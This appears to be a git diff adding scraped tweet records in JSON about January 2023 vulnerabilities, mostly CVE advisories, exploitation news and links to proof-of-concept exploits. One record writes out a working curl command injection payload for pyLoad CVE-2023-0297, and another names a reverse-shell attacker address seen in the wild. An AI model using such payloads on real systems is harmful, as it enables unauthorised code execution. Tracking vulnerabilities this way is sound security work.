@@ -852,3 +852,1711 @@
     "tweeturl": "https://twitter.com/0xor0ne/status/1610248371498897408",
     "username": "0xor0ne"
 }
+{
+    "expanded_url": [
+        "https://www.zerodayinitiative.com/advisories/ZDI-23-093/"
+    ],
+    "tweetfavorites": 39,
+    "tweetquotes": 1,
+    "tweetreplies": 1,
+    "tweetretweets": 8,
+    "tweettext": "[ZDI-23-093|CVE-2022-46169] Cacti poll_for_data Command Injection Remote Code Execution Vulnerability (CVSS 9.8; Credit: @steventseeley) https://t.co/cxIcb015YU",
+    "tweettime": "2023-01-31, 16:58:42",
+    "tweeturl": "https://twitter.com/TheZDIBugs/status/1620466614771523588",
+    "username": "TheZDIBugs"
+}
+{
+    "expanded_url": [
+        "https://www.horizon3.ai/vmware-vrealize-log-insight-vmsa-2023-0001-technical-deep-dive/"
+    ],
+    "tweetfavorites": 211,
+    "tweetquotes": 5,
+    "tweetreplies": 6,
+    "tweetretweets": 88,
+    "tweettext": "Our technical deep-dive blog post for the recent #VMware vRealize Log Insight RCE vulnerability chain leading to root privileges.\n💥CVE-2022-31704, CVE-2022-31706, CVE-2022-31711\n💥POC exploit in post\n\nhttps://t.co/g7CxjMvHop",
+    "tweettime": "2023-01-31, 12:10:38",
+    "tweeturl": "https://twitter.com/Horizon3Attack/status/1620394119930728449",
+    "username": "Horizon3Attack"
+}
+{
+    "expanded_url": [
+        "https://github.com/dbgsymbol/windows_lpe_pocs/blob/main/cve-2021-34514-alpc_oob-poc.cpp"
+    ],
+    "tweetfavorites": 87,
+    "tweetquotes": 4,
+    "tweetreplies": 0,
+    "tweetretweets": 41,
+    "tweettext": "PoC of CVE-2021-34514, ALPC OOB Access Bug\nhttps://t.co/3EjwokkMVs",
+    "tweettime": "2023-01-31, 09:24:34",
+    "tweeturl": "https://twitter.com/Paul091_/status/1620352328179277824",
+    "username": "Paul091_"
+}
+{
+    "expanded_url": [
+        "https://github.com/alalng/CVE-2022-44789"
+    ],
+    "tweetfavorites": 32,
+    "tweetquotes": 4,
+    "tweetreplies": 1,
+    "tweetretweets": 11,
+    "tweettext": "Read my writeup and exploit for a Use-After-Free Vulnerability in Artifex MuJS (CVE-2022-44789): https://t.co/BvF3PkKemm \n\nHope some of the techniques used can help pwners in solving future MuJS CTF challs.🙂 https://t.co/fQ5W5lrku4",
+    "tweettime": "2023-01-29, 23:30:36",
+    "tweeturl": "https://twitter.com/alngpwn/status/1619840465876193281",
+    "username": "alngpwn"
+}
+{
+    "expanded_url": [
+        "https://github.com/alt3kx/CVE-2023-24055_PoC"
+    ],
+    "tweetfavorites": 226,
+    "tweetquotes": 4,
+    "tweetreplies": 4,
+    "tweetretweets": 102,
+    "tweettext": "CVE-2023-24055 PoC (KeePass 2.5x)\nhttps://t.co/CVzndZOj5M",
+    "tweettime": "2023-01-28, 09:22:35",
+    "tweeturl": "https://twitter.com/momika233/status/1619264666051682304",
+    "username": "momika233"
+}
+{
+    "expanded_url": [
+        "https://github.com/akamai/akamai-security-research/tree/main/PoCs/CVE-2022-34689"
+    ],
+    "tweetfavorites": 76,
+    "tweetquotes": 1,
+    "tweetreplies": 2,
+    "tweetretweets": 26,
+    "tweettext": "CVE-2022-34689 - CryptoAPI spoofing vulnerability\nhttps://t.co/ludebFgFQO",
+    "tweettime": "2023-01-28, 01:12:51",
+    "tweeturl": "https://twitter.com/momika233/status/1619141420681658369",
+    "username": "momika233"
+}
+{
+    "expanded_url": [
+        "https://www.horizon3.ai/vmware-vrealize-cve-2022-31706-iocs/"
+    ],
+    "tweetfavorites": 73,
+    "tweetquotes": 2,
+    "tweetreplies": 1,
+    "tweetretweets": 36,
+    "tweettext": "Our Indicators of Compromise blog post for the recent #VMware vRealize Log Insight RCE vulnerability chain.\n🔹Log File Entries\n🔹Packet Capture\n🔹Shodan Exposure\n🔹CVE-2022-31704, CVE-2022-31706, CVE-2022-31711\n\nhttps://t.co/CbiXQMx1Eh",
+    "tweettime": "2023-01-27, 19:25:05",
+    "tweeturl": "https://twitter.com/Horizon3Attack/status/1619053903684964352",
+    "username": "Horizon3Attack"
+}
+{
+    "tweetfavorites": 75,
+    "tweetquotes": 2,
+    "tweetreplies": 0,
+    "tweetretweets": 27,
+    "tweettext": "CVE-2023-0297\nPre-auth RCE in pyLoad\n\ncurl -i -s -k -X $'POST' \\\n    --data-binary $'jk=pyimport%20os;os.system(\\\"touch%20/tmp/pwnd\\\");f=function%20f2(){};&amp;package=xxx&amp;crypted=AAAA&amp;&amp;passwords=aaaa' \\\n    $'http://&lt;target&gt;/flash/addcrypted2'\n\nExploit",
+    "tweettime": "2023-01-27, 08:44:03",
+    "tweeturl": "https://twitter.com/akaclandestine/status/1618892579432726529",
+    "username": "akaclandestine"
+}
+{
+    "expanded_url": [
+        "https://www.vmware.com/security/advisories/VMSA-2023-0001.html"
+    ],
+    "tweetfavorites": 416,
+    "tweetquotes": 8,
+    "tweetreplies": 4,
+    "tweetretweets": 143,
+    "tweettext": "Exploitation of multiple vulnerabilities affecting #VMware vRealize Log Insight leads to unauth RCE\n🔺 CVE-2022-31704, CVE-2022-31706, CVE-2022-31711\n🔺 IOC Blog tomorrow\n🔺 POC / Deep-Dive  Blog next week\n\nSee VMware Security Advisory: https://t.co/tldhMQPoPK https://t.co/VesGlE8u5R",
+    "tweettime": "2023-01-26, 19:44:06",
+    "tweeturl": "https://twitter.com/Horizon3Attack/status/1618696299897028609",
+    "username": "Horizon3Attack"
+}
+{
+    "expanded_url": [
+        "https://securityintelligence.com/posts/dissecting-exploiting-tcp-ip-rce-vulnerability-evilesp/"
+    ],
+    "tweetfavorites": 199,
+    "tweetquotes": 1,
+    "tweetreplies": 1,
+    "tweetretweets": 62,
+    "tweettext": "Very well written #Windows #patchdiffing and #nday #exploitation walkthrough ✊ \n\nDissecting and Exploiting TCP/IP RCE #Vulnerability EvilESP (CVE-2022-34718)\n\n// by Valentina Palmiotti\n\nhttps://t.co/CI1aJpnUj1 https://t.co/A1pYVNpSFH",
+    "tweettime": "2023-01-26, 12:50:07",
+    "tweeturl": "https://twitter.com/0xdea/status/1618592116724338688",
+    "username": "0xdea"
+}
+{
+    "expanded_url": [
+        "https://www.bleepingcomputer.com/news/security/exploit-released-for-critical-windows-cryptoapi-spoofing-bug/"
+    ],
+    "tweetfavorites": 132,
+    "tweetquotes": 4,
+    "tweetreplies": 1,
+    "tweetretweets": 63,
+    "tweettext": "Proof of concept exploit code is now available for a critical Windows CryptoAPI vulnerability (CVE-2022-34689) discovered by the NSA and UK's NCSC - @serghei\nhttps://t.co/h2HyFhmjbt",
+    "tweettime": "2023-01-25, 23:45:47",
+    "tweeturl": "https://twitter.com/BleepinComputer/status/1618394732899475456",
+    "username": "BleepinComputer"
+}
+{
+    "expanded_url": [
+        "https://www.synacktiv.com/sites/default/files/2023-01/fortimanager_multiple_vulnerabilities_2021_published_lpe.pdf"
+    ],
+    "tweetfavorites": 43,
+    "tweetquotes": 1,
+    "tweetreplies": 1,
+    "tweetretweets": 11,
+    "tweettext": "A follow-up LPE vulnerability (CVE-2022-26118) was discovered, exploited and reported by @loadlow, @b1two_ and @taryax on Fortimanager. It is now fixed.\nFor further information, take a look at the advisory: https://t.co/WqwBmscZn3",
+    "tweettime": "2023-01-25, 16:34:04",
+    "tweeturl": "https://twitter.com/Synacktiv/status/1618286088019410945",
+    "username": "Synacktiv"
+}
+{
+    "expanded_url": [
+        "https://www.rcesecurity.com/2022/11/from-zero-to-hero-part-1-bypassing-intel-dcms-authentication-cve-2022-33942/",
+        "https://www.rcesecurity.com/2022/12/from-zero-to-hero-part-2-intel-dcm-sql-injection-to-rce-cve-2022-21225/"
+    ],
+    "tweetfavorites": 99,
+    "tweetquotes": 1,
+    "tweetreplies": 2,
+    "tweetretweets": 43,
+    "tweettext": "Awesome Two Part Series by @MrTuxracer on a vulnerability chain from unauthenticated user to full RCE in Intel’s Data Center Manager\n\nAuth Bypass (CVE-2022-33942): https://t.co/BNe0hY4rU5\n\nSQLi to RCE (CVE-2022-21225): https://t.co/DciDd9dUj3\n\n#infosec #hacking #bugbounty https://t.co/I271BuVICi",
+    "tweettime": "2023-01-25, 14:30:00",
+    "tweeturl": "https://twitter.com/payloadartist/status/1618254865368506369",
+    "username": "payloadartist"
+}
+{
+    "expanded_url": [
+        "https://www.bleepingcomputer.com/news/apple/apple-fixes-actively-exploited-ios-zero-day-on-older-iphones-ipads/"
+    ],
+    "tweetfavorites": 60,
+    "tweetquotes": 6,
+    "tweetreplies": 2,
+    "tweetretweets": 40,
+    "tweettext": "Apple has backported patches for an \"actively exploited\" zero-day vulnerability, tracked as CVE-2022-42856, to older iPhones and iPads\nhttps://t.co/fPRcIm1ZSE",
+    "tweettime": "2023-01-23, 19:36:32",
+    "tweeturl": "https://twitter.com/BleepinComputer/status/1617607233117855746",
+    "username": "BleepinComputer"
+}
+{
+    "expanded_url": [
+        "https://github.blog/2023-01-23-pwning-the-all-google-phone-with-a-non-google-bug/"
+    ],
+    "tweetfavorites": 376,
+    "tweetquotes": 7,
+    "tweetreplies": 2,
+    "tweetretweets": 136,
+    "tweettext": "In this post I'll use CVE-2022-38181, a use-after-free I reported last year in the Arm Mali GPU driver to gain arbitrary kernel code execution and root from untrusted Android app. Not sure if the bug or the disclosure is more interesting: https://t.co/8eu0PxGZeu",
+    "tweettime": "2023-01-23, 17:11:11",
+    "tweeturl": "https://twitter.com/mmolgtm/status/1617570652390854658",
+    "username": "mmolgtm"
+}
+{
+    "expanded_url": [
+        "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-24059",
+        "https://www.reddit.com/r/gtaonline/comments/10hsosu/mass_reporting_the_dangerous_pc_exploit/"
+    ],
+    "tweetfavorites": 392,
+    "tweetquotes": 15,
+    "tweetreplies": 7,
+    "tweetretweets": 90,
+    "tweettext": "Grand Theft Auto V has been assigned CVE-2023-24059 for containing a partial Remote Code Execution exploit\n\nMore information: https://t.co/Cwxt6gDmpY\n\nGrand Theft Auto Online community discussion: https://t.co/JrcEhESlu3",
+    "tweettime": "2023-01-23, 06:41:56",
+    "tweeturl": "https://twitter.com/vxunderground/status/1617412298817130500",
+    "username": "vxunderground"
+}
+{
+    "expanded_url": [
+        "https://github.com/projectdiscovery/nuclei-templates/pull/6571",
+        "https://blog.viettelcybersecurity.com/cve-2022-21587-oracle-e-business-suite-unauth-rce/",
+        "https://www.oracle.com/security-alerts/cpuoct2022.html"
+    ],
+    "tweetfavorites": 198,
+    "tweetquotes": 2,
+    "tweetreplies": 0,
+    "tweetretweets": 60,
+    "tweettext": "Scanning for CVE-2022-21587 (Oracle EBS Unauthenticated - Remote Code Execution) using Nuclei\n\nNuclei Template –– https://t.co/6ZcVlhbPsL\n\nReference ––\n1. https://t.co/LEtdmXHMAt\n2. https://t.co/qSrXQ9HcGc\n\n#hackwithautomation #bugbounty #security #appsec https://t.co/3FsijLzVKr",
+    "tweettime": "2023-01-21, 17:29:29",
+    "tweeturl": "https://twitter.com/pdnuclei/status/1616850483871875073",
+    "username": "pdnuclei"
+}
+{
+    "expanded_url": [
+        "https://www.bleepingcomputer.com/news/security/critical-manageengine-rce-bug-now-exploited-to-open-reverse-shells/"
+    ],
+    "tweetfavorites": 37,
+    "tweetquotes": 2,
+    "tweetreplies": 0,
+    "tweetretweets": 18,
+    "tweettext": "Attackers are now actively exploiting a critical Zoho ManageEngine RCE vulnerability (CVE-2022-47966) with public exploit code to open reverse shells on compromised devices - @serghei\nhttps://t.co/winJyEOM7Z",
+    "tweettime": "2023-01-20, 19:08:26",
+    "tweeturl": "https://twitter.com/BleepinComputer/status/1616512995026210823",
+    "username": "BleepinComputer"
+}
+{
+    "expanded_url": [
+        "https://securityintelligence.com/posts/dissecting-exploiting-tcp-ip-rce-vulnerability-evilesp/"
+    ],
+    "tweetfavorites": 1069,
+    "tweetquotes": 10,
+    "tweetreplies": 14,
+    "tweetretweets": 317,
+    "tweettext": "My new blog post! Dissecting and Exploiting TCP/IP RCE Vulnerability “EvilESP”. Reverse engineering CVE-2022-34718 + write a remote Denial of Service exploit. Covers IPsec and IPv6 fragmentation in the Windows kernel, bin-diffing, and making weird packets https://t.co/XR8qhoq1ub",
+    "tweettime": "2023-01-20, 18:51:41",
+    "tweeturl": "https://twitter.com/chompie1337/status/1616508780061298689",
+    "username": "chompie1337"
+}
+{
+    "tweetfavorites": 160,
+    "tweetquotes": 1,
+    "tweetreplies": 5,
+    "tweetretweets": 41,
+    "tweettext": "CVE-2022-47966: ManageEngine RCE PoC:\n\n#BugBounty https://t.co/kW3AVYaPKX",
+    "tweettime": "2023-01-20, 12:02:14",
+    "tweeturl": "https://twitter.com/sheikhrishad0/status/1616405741912588289",
+    "username": "sheikhrishad0"
+}
+{
+    "tweetfavorites": 0,
+    "tweetquotes": 0,
+    "tweetreplies": 0,
+    "tweetretweets": 86,
+    "tweettext": "RT @_marklech_: [1/2] Fortinet has published an advisory on active exploitation of CVE-2022-42475 in the wild. My colleagues at Mandiant an…",
+    "tweettime": "2023-01-20, 08:50:42",
+    "tweeturl": "https://twitter.com/cherepanov74/status/1616357539347578881",
+    "username": "cherepanov74"
+}
+{
+    "expanded_url": [
+        "https://blog.exodusintel.com/2022/12/19/linux-kernel-exploiting-a-netfilter-use-after-free-in-kmalloc-cg/"
+    ],
+    "tweetfavorites": 255,
+    "tweetquotes": 2,
+    "tweetreplies": 2,
+    "tweetretweets": 84,
+    "tweettext": "CVE-2022-32250 : use-after-free in Linux kernel\nExploitation writeup by @ExodusIntel targeting Linux kernel 5.18.1\n\nhttps://t.co/W6U8j5bZtq \n\n#Linux #kernel #exploit #cve #infosec #cybersecurity https://t.co/rm0FV9O52n",
+    "tweettime": "2023-01-20, 08:00:32",
+    "tweeturl": "https://twitter.com/0xor0ne/status/1616344915520241672",
+    "username": "0xor0ne"
+}
+{
+    "expanded_url": [
+        "https://thehackernews.com/2023/01/new-chinese-malware-spotted-exploiting.html"
+    ],
+    "tweetfavorites": 34,
+    "tweetquotes": 4,
+    "tweetreplies": 0,
+    "tweetretweets": 24,
+    "tweettext": "Researchers are warning of a new Chinese #malware called \"BOLDMOVE\" that exploited a recently discovered #vulnerability in #Fortinet FortiOS SSL-VPN (CVE-2022-42475) as a zero-day to attack government entities &amp; managed service providers.\n\nhttps://t.co/OyUr9Tp6vw\n\n#cybersecurity",
+    "tweettime": "2023-01-20, 07:00:49",
+    "tweeturl": "https://twitter.com/TheHackersNews/status/1616329885194260480",
+    "username": "TheHackersNews"
+}
+{
+    "expanded_url": [
+        "https://github.com/projectdiscovery/nuclei-templates/pull/6564/files"
+    ],
+    "tweetfavorites": 166,
+    "tweetquotes": 1,
+    "tweetreplies": 1,
+    "tweetretweets": 55,
+    "tweettext": "🧨 RCE in ManageEngine\n\nRemote Code Execution Vulnerability in ManageEngine products (CVE-2022-47966) due to the use of an outdated version of Apache Santuario.\n\nDork for Shodan:\ntitle:\"ManageEngine\"\n\nLink to template for Nuclei ( https://t.co/frUopqbbbq ) \n\n #rce #cve #BugBounty https://t.co/iKRiFM3ct9",
+    "tweettime": "2023-01-20, 04:54:35",
+    "tweeturl": "https://twitter.com/TodayCyberNews/status/1616298119301599232",
+    "username": "TodayCyberNews"
+}
+{
+    "expanded_url": [
+        "https://www.zerodayinitiative.com/blog/2023/1/18/cve-2022-35690-unauthenticated-rce-in-adobe-coldfusion"
+    ],
+    "tweetfavorites": 65,
+    "tweetquotes": 4,
+    "tweetreplies": 0,
+    "tweetretweets": 19,
+    "tweettext": "The latest post from the good folks at the Trend Micro Research Team looks at CVE-2022-35690 - a remote, unauth RCE in #Adobe ColdFusion rated at a CVSS 9.8. Note that you need to patch AND update the ColdFusion JDK/JRE to be protected. https://t.co/g57yropYKI",
+    "tweettime": "2023-01-19, 17:46:06",
+    "tweeturl": "https://twitter.com/thezdi/status/1616129890604007450",
+    "username": "thezdi"
+}
+{
+    "expanded_url": [
+        "https://www.horizon3.ai/manageengine-cve-2022-47966-technical-deep-dive/"
+    ],
+    "tweetfavorites": 239,
+    "tweetquotes": 7,
+    "tweetreplies": 2,
+    "tweetretweets": 92,
+    "tweettext": "Our technical deep-dive of the recent #ManageEngine Pre-Auth RCE CVE-2022-47966. \n\nPOC exploit included for xmlsec &lt;= 1.4.1. Other versions also exploitable.\n\nhttps://t.co/mcStCEws6h",
+    "tweettime": "2023-01-19, 13:19:58",
+    "tweeturl": "https://twitter.com/Horizon3Attack/status/1616062915097886732",
+    "username": "Horizon3Attack"
+}
+{
+    "expanded_url": [
+        "https://blog.viettelcybersecurity.com/cve-2022-21587-oracle-e-business-suite-unauth-rce/"
+    ],
+    "tweetfavorites": 102,
+    "tweetquotes": 3,
+    "tweetreplies": 1,
+    "tweetretweets": 41,
+    "tweettext": "Oracle EBS Unauth RCE #CVE-2022-21587 analysis from our researchers @vudq16 @_q5ca @hoangnx99 https://t.co/WTC2eyx0uf",
+    "tweettime": "2023-01-19, 06:39:38",
+    "tweeturl": "https://twitter.com/vcslab/status/1615962168352178176",
+    "username": "vcslab"
+}
+{
+    "expanded_url": [
+        "https://weiyiling.cn/one/firefox_0day_case_analysis"
+    ],
+    "tweetfavorites": 223,
+    "tweetquotes": 5,
+    "tweetreplies": 2,
+    "tweetretweets": 73,
+    "tweettext": "Release the Firefox wild 0day (CVE-2022-26485 &amp;&amp; CVE-2022-26486) analysis : https://t.co/pIzXfIWiR2 https://t.co/7OjqyrCQP0",
+    "tweettime": "2023-01-19, 03:00:59",
+    "tweeturl": "https://twitter.com/huangzhenyuan/status/1615907142078431235",
+    "username": "huangzhenyuan"
+}
+{
+    "expanded_url": [
+        "https://www.zerodayinitiative.com/advisories/ZDI-23-055/"
+    ],
+    "tweetfavorites": 35,
+    "tweetquotes": 2,
+    "tweetreplies": 0,
+    "tweetretweets": 13,
+    "tweettext": "[ZDI-23-055|CVE-2022-31702] VMware vRealize Network Insight createSupportBundle Command Injection Remote Code Execution Vulnerability (CVSS 9.8) https://t.co/83D4lW3DOs",
+    "tweettime": "2023-01-18, 17:18:18",
+    "tweeturl": "https://twitter.com/TheZDIBugs/status/1615760504546365440",
+    "username": "TheZDIBugs"
+}
+{
+    "expanded_url": [
+        "https://www.synacktiv.com/sites/default/files/2023-01/sudo-CVE-2023-22809.pdf"
+    ],
+    "tweetfavorites": 347,
+    "tweetquotes": 10,
+    "tweetreplies": 8,
+    "tweetretweets": 180,
+    "tweettext": "Watchout! CVE-2023-22809 on Sudo was patched today to prevent a privilege escalation on sudoedit. Read the security advisory by @aevy__ and @v1csec: https://t.co/w2uco4PGhh https://t.co/NPkWJYq74X",
+    "tweettime": "2023-01-18, 15:28:18",
+    "tweeturl": "https://twitter.com/Synacktiv/status/1615732821070315521",
+    "username": "Synacktiv"
+}
+{
+    "tweetfavorites": 40,
+    "tweetquotes": 2,
+    "tweetreplies": 1,
+    "tweetretweets": 13,
+    "tweettext": "#APT #Oceanlotus use CobaltStrike RCE Exploit (CVE-2022-39197) to attack redteam or user. https://t.co/cVAhGJbuwe",
+    "tweettime": "2023-01-18, 15:08:05",
+    "tweeturl": "https://twitter.com/blackorbird/status/1615727736676548610",
+    "username": "blackorbird"
+}
+{
+    "tweetfavorites": 40,
+    "tweetquotes": 2,
+    "tweetreplies": 3,
+    "tweetretweets": 22,
+    "tweettext": "#Darkhotel use Firefox 0day exploit attack.\nCVE-2022-26485\nCVE-2022-26486 https://t.co/fKdA5tJ5Ef",
+    "tweettime": "2023-01-18, 10:04:39",
+    "tweeturl": "https://twitter.com/blackorbird/status/1615651374829809667",
+    "username": "blackorbird"
+}
+{
+    "expanded_url": [
+        "https://github.com/dbgsymbol/windows_lpe_pocs/blob/main/cve-2022-21881-io_completion-poc.cpp"
+    ],
+    "tweetfavorites": 87,
+    "tweetquotes": 2,
+    "tweetreplies": 0,
+    "tweetretweets": 26,
+    "tweettext": "Uploaded Poc of CVE-2022-21881 used for Chrome SBX\n\nhttps://t.co/PqWlbNzfob",
+    "tweettime": "2023-01-17, 02:38:32",
+    "tweeturl": "https://twitter.com/Paul091_/status/1615176716422631424",
+    "username": "Paul091_"
+}
+{
+    "expanded_url": [
+        "http://bit.ly/3abVdnO",
+        "https://github.com/Ridter/cve-2020-0688",
+        "http://bit.ly/2uOvItE"
+    ],
+    "tweetfavorites": 69,
+    "tweetquotes": 1,
+    "tweetreplies": 0,
+    "tweetretweets": 35,
+    "tweettext": "RCE on MS Exchange Server Through Fixed Cryptographic Keys (CVE-2020-0688). https://t.co/4RQfUgLh5u (+) PoC: https://t.co/pdVGZaP8D3 | https://t.co/ekT8yjYqHV (+) #MustSee #315 (2020)",
+    "tweettime": "2023-01-15, 12:00:02",
+    "tweeturl": "https://twitter.com/OPOSEC/status/1614593248659488774",
+    "username": "OPOSEC"
+}
+{
+    "expanded_url": [
+        "https://thehackernews.com/2023/01/fortios-flaw-exploited-as-zero-day-in.html?m=1"
+    ],
+    "tweetfavorites": 64,
+    "tweetquotes": 3,
+    "tweetreplies": 1,
+    "tweetretweets": 19,
+    "tweettext": "Hackers leveraged a zero-day #vulnerability (CVE-2022-42475) in FortiOS SSL-VPN to target governments and large organizations.\n\n(nuclei template available soon)\n\n#cybersecurity #Fortinet #0day\nhttps://t.co/3C11i5zaHF",
+    "tweettime": "2023-01-14, 19:01:25",
+    "tweeturl": "https://twitter.com/ReconOne_bk/status/1614336904597573640",
+    "username": "ReconOne_bk"
+}
+{
+    "expanded_url": [
+        "https://explore.zoom.us/en/trust/security/security-bulletin/"
+    ],
+    "tweetfavorites": 38,
+    "tweetquotes": 0,
+    "tweetreplies": 1,
+    "tweetretweets": 3,
+    "tweettext": "My latest contribution (CVE-2022-36928) to Zoom for Android clients before version 5.13.0 contain a path traversal vulnerability. A third party app could exploit this vulnerability to read and write to the Zoom application data directory.\nhttps://t.co/usXjko2EhS",
+    "tweettime": "2023-01-13, 18:54:02",
+    "tweeturl": "https://twitter.com/Ch0pin/status/1613972658676457474",
+    "username": "Ch0pin"
+}
+{
+    "expanded_url": [
+        "https://www.horizon3.ai/manageengine-cve-2022-47966-iocs/"
+    ],
+    "tweetfavorites": 150,
+    "tweetquotes": 3,
+    "tweetreplies": 2,
+    "tweetretweets": 53,
+    "tweettext": "Indicators of Compromise for #ManageEngine CVE-2022-47966:\n🔺Log File Entries\n🔺Shodan Exposure\n🔺Potential Post-Exploitation Activities\n\nDeep-dive blog and POC will be released next week.\n\nhttps://t.co/0MQvvozGgQ\n\nAwesome effort by @JamesHorseman2, Naveen, and @hacks_zach",
+    "tweettime": "2023-01-13, 15:52:58",
+    "tweeturl": "https://twitter.com/Horizon3Attack/status/1613927091426451456",
+    "username": "Horizon3Attack"
+}
+{
+    "expanded_url": [
+        "https://arstechnica.com/information-technology/2023/01/vulnerability-with-9-8-severity-in-control-web-panel-is-under-active-exploit/"
+    ],
+    "tweetfavorites": 50,
+    "tweetquotes": 3,
+    "tweetreplies": 24,
+    "tweetretweets": 27,
+    "tweettext": "Active exploitation of Centos Control Web Panel through CVE-2022-44877.  Patch issued in Oct. Exploitation is picking up. Attackers can get elevated privileges and remote code execution, leading to dangerous exploitation.  Close down this vulnerability.  \n\nhttps://t.co/k3N1Fynk4E",
+    "tweettime": "2023-01-13, 10:49:27",
+    "tweeturl": "https://twitter.com/NSA_CSDirector/status/1613850710453501955",
+    "username": "NSA_CSDirector"
+}
+{
+    "expanded_url": [
+        "https://thehackernews.com/2023/01/fortios-flaw-exploited-as-zero-day-in.html?m=1"
+    ],
+    "tweetfavorites": 38,
+    "tweetquotes": 2,
+    "tweetreplies": 0,
+    "tweetretweets": 12,
+    "tweettext": "A #vulnerability (CVE-2022-42475) in FortiOS SSL-VPN was exploited by hackers as a \"zero-day\" to attack governments and large organizations before #Fortinet fixed it.\n\nhttps://t.co/NWitGQH8GE",
+    "tweettime": "2023-01-13, 09:45:26",
+    "tweeturl": "https://twitter.com/AnonOpsSE/status/1613834598571560960",
+    "username": "AnonOpsSE"
+}
+{
+    "expanded_url": [
+        "https://thehackernews.com/2023/01/fortios-flaw-exploited-as-zero-day-in.html"
+    ],
+    "tweetfavorites": 227,
+    "tweetquotes": 7,
+    "tweetreplies": 4,
+    "tweetretweets": 75,
+    "tweettext": "A #vulnerability (CVE-2022-42475) in FortiOS SSL-VPN was exploited by hackers as a \"zero-day\" to attack governments and large organizations before #Fortinet fixed it.\n\nDetails: https://t.co/OPRoYakewo\n\n#infosec #cyberattack #cybersecurity #hacking",
+    "tweettime": "2023-01-13, 09:43:26",
+    "tweeturl": "https://twitter.com/TheHackersNews/status/1613834093434925059",
+    "username": "TheHackersNews"
+}
+{
+    "expanded_url": [
+        "https://github.com/momika233/CVE-2022-3656"
+    ],
+    "tweetfavorites": 124,
+    "tweetquotes": 1,
+    "tweetreplies": 1,
+    "tweetretweets": 49,
+    "tweettext": "https://t.co/fRV7O7cXAJ\nImperva Red Team recently disclosed a vulnerability named CVE-2022-3656, which allows the theft of sensitive documents, such as encrypted wallets and cloud provider credentials. #Chrome #GoogleForIndia",
+    "tweettime": "2023-01-13, 03:37:39",
+    "tweeturl": "https://twitter.com/momika233/status/1613742044387893249",
+    "username": "momika233"
+}
+{
+    "expanded_url": [
+        "https://github.com/Wh04m1001/CVE-2023-21752"
+    ],
+    "tweetfavorites": 161,
+    "tweetquotes": 1,
+    "tweetreplies": 1,
+    "tweetretweets": 41,
+    "tweettext": "PoC for arbitrary file delete vulnerability in Windows Backup service. CVE-2023-21752\nhttps://t.co/H2Ve2qYZD9",
+    "tweettime": "2023-01-12, 08:26:06",
+    "tweeturl": "https://twitter.com/momika233/status/1613452247199023105",
+    "username": "momika233"
+}
+{
+    "expanded_url": [
+        "https://gist.github.com/numanturle/c1e82c47f4cba24cff214e904c227386"
+    ],
+    "tweetfavorites": 33,
+    "tweetquotes": 1,
+    "tweetreplies": 0,
+    "tweetretweets": 17,
+    "tweettext": "Centos Web Panel 7 Unauthenticated Remote Code Execution - CVE-2022-44877\n#BugBounty #bugbountytips #CVE #RCE\nhttps://t.co/GAtHnXttmW",
+    "tweettime": "2023-01-12, 08:25:03",
+    "tweeturl": "https://twitter.com/momika233/status/1613451981766684673",
+    "username": "momika233"
+}
+{
+    "tweetfavorites": 187,
+    "tweetquotes": 3,
+    "tweetreplies": 1,
+    "tweetretweets": 57,
+    "tweettext": "Reproducing the recent #ManageEngine CVE-2022-47966 pre-auth RCE, which affects nearly all of their products, has definitely been eye-opening about some recent SAML research that flew under our radar. POC and blog to come.\n\nCredit to the original researcher @_l0gg, nice find! https://t.co/qpkNZYH3c6",
+    "tweettime": "2023-01-12, 03:42:21",
+    "tweeturl": "https://twitter.com/Horizon3Attack/status/1613380836660748288",
+    "username": "Horizon3Attack"
+}
+{
+    "expanded_url": [
+        "https://github.com/michalbednarski/LeakValue"
+    ],
+    "tweetfavorites": 76,
+    "tweetquotes": 2,
+    "tweetreplies": 2,
+    "tweetretweets": 35,
+    "tweettext": "Writeup and exploit for CVE-2022-20452, privilege escalation on Android 13 via Parcel use-after-recycle() - https://t.co/Ql2Hlrjppl #MobileSecurity #Android #RCE by @BednarTildeOne https://t.co/oqLV0p6O5G",
+    "tweettime": "2023-01-11, 19:08:33",
+    "tweeturl": "https://twitter.com/Din3zh/status/1613251535378456591",
+    "username": "Din3zh"
+}
+{
+    "tweetfavorites": 106,
+    "tweetquotes": 3,
+    "tweetreplies": 6,
+    "tweetretweets": 40,
+    "tweettext": "🚨 Ongoing mass exploitation of CVE-2022-44877 (Centos Web Panel 7 Unauthenticated Remote Code Execution).\n\nSource: 206.189.170.136 🇺🇸\n\nMalicious Base64 payload is a reverse shell that connects to 206.189.170.136:9181\n\nThe scanning of CWP instances started around January 06th. https://t.co/PC8b9frmA9",
+    "tweettime": "2023-01-11, 18:05:08",
+    "tweeturl": "https://twitter.com/1ZRR4H/status/1613235576626372608",
+    "username": "1ZRR4H"
+}
+{
+    "expanded_url": [
+        "https://infosecwriteups.com/cve-2022-38627-a-journey-through-sqlite-injection-to-compromise-the-whole-enterprise-building-15cebd072ed6"
+    ],
+    "tweetfavorites": 80,
+    "tweetquotes": 0,
+    "tweetreplies": 2,
+    "tweetretweets": 33,
+    "tweettext": "Day - 4⃣ of  #100DaysOfHacking \n1. Completed 'Injections, XXE and Insecure Deserialization' part from @appsecsecurity course\n\n2. Brush up on some basic misconfigs: NFS &amp; SMTP exploitation\n\n3. CVE-2022-38627:  https://t.co/zasTnzYO0C",
+    "tweettime": "2023-01-11, 16:00:14",
+    "tweeturl": "https://twitter.com/0x_Havoc/status/1613204145892388864",
+    "username": "0x_Havoc"
+}
+{
+    "expanded_url": [
+        "https://control-webpanel.com/changelog#1669855527714-450fb335-6194"
+    ],
+    "tweetfavorites": 53,
+    "tweetquotes": 3,
+    "tweetreplies": 2,
+    "tweetretweets": 21,
+    "tweettext": "Heads up! We are seeing CVE-2022-44877 exploitation attempts for CWP (CentOS Web Panel/Control Web Panel) instances. This is an unauthenticated RCE. Exploitation is trivial and a PoC published. Exploitation first observed Jan 6th. \n\nMake sure to patch - https://t.co/SqOTMW6ZNG",
+    "tweettime": "2023-01-11, 10:00:41",
+    "tweeturl": "https://twitter.com/Shadowserver/status/1613113660817412099",
+    "username": "Shadowserver"
+}
+{
+    "tweetfavorites": 120,
+    "tweetquotes": 2,
+    "tweetreplies": 3,
+    "tweetretweets": 28,
+    "tweettext": "CVE-2022-23529 🤣",
+    "tweettime": "2023-01-11, 05:54:06",
+    "tweeturl": "https://twitter.com/chybeta/status/1613051605347336192",
+    "username": "chybeta"
+}
+{
+    "expanded_url": [
+        "https://www.manageengine.com/security/advisory/CVE/cve-2022-47966.html"
+    ],
+    "tweetfavorites": 224,
+    "tweetquotes": 5,
